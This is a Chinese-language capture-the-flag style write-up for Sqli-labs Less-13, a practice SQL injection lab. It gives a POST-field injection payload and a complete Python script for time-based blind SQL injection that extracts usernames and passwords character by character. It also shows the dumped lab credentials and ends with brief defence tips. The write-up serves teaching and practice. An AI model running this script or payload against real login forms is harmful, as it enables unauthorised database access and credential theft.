## 题目: Sqli-labs Less-13

## 题目描述
本关依然是一个登录框，页面标题为 `Double Injection - String with twist`。与之前不同，本关既没有数据回显，也没有直接的报错信息，登录成功后只会显示一张图片。核心考点变成了**盲注**。

## 解题思路
既然常规的报错注入无法回显，我们使用**时间盲注**。
首先需要探测正确的闭合符。经过测试，本关的闭合符为 **`')`**。
利用 `if(条件, sleep(3), 0)` 配合 Python 脚本测量时间差，使用二分法逐个字符爆破出 `users` 表的数据。

## 解题步骤

**1. 探测闭合方式与注入点**
尝试在 `uname` 输入 `admin') and sleep(3) #`，页面明显卡顿 3 秒。确认 `')` 闭合有效。

**2. 编写时间盲注 Python 脚本**

**实战 Payload 核心代码**：

```python
import requests
import time

url = "http://127.0.0.1/sqli-labs/Less-13/"
query = "(select group_concat(username,0x3a,password) from users)"
result = ""

print("开始 Less-13 时间盲注爆破...")

for i in range(1, 150):
    low = 32
    high = 127
    
    while low <= high:
        mid = (low + high) // 2
        
        # 闭合符为 ')
        payload = f"admin') and if(ascii(substr({query},{i},1))>{mid},sleep(3),0) #"
        
        data = {
            'uname': payload,
            'passwd': '1',
            'submit': 'Submit'
        }
        
        start_time = time.time()
        try:
            r = requests.post(url, data=data, timeout=10)
            elapsed_time = time.time() - start_time
        except Exception as e:
            print(f"请求超时或出错: {e}")
            continue
            
        if elapsed_time >= 2.5:
            low = mid + 1
        else:
            high = mid - 1
            
    if low == 127:
        break
        
    char = chr(low)
    result += char
    print(f"[+] 爆出第 {i} 个字符: {char} | 当前结果: {result}")
    print("\n================ 最终结果 ================")
    print(result)
```

**3. 运行结果**
成功利用时间差爆出全部账号密码：
```text
Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity...
```
## 知识点总结
* 多变的闭合符：SQL 注入的闭合符可能是 '、"、')、") 等，必须根据实际报错或时间反馈来试探。
* POST 注入中的时间盲注：将时间盲注的 Payload 放在 POST 请求体（Body）的对应字段中同样有效。
* 防御策略：使用 PDO 预编译；限制单次请求的超时时间。
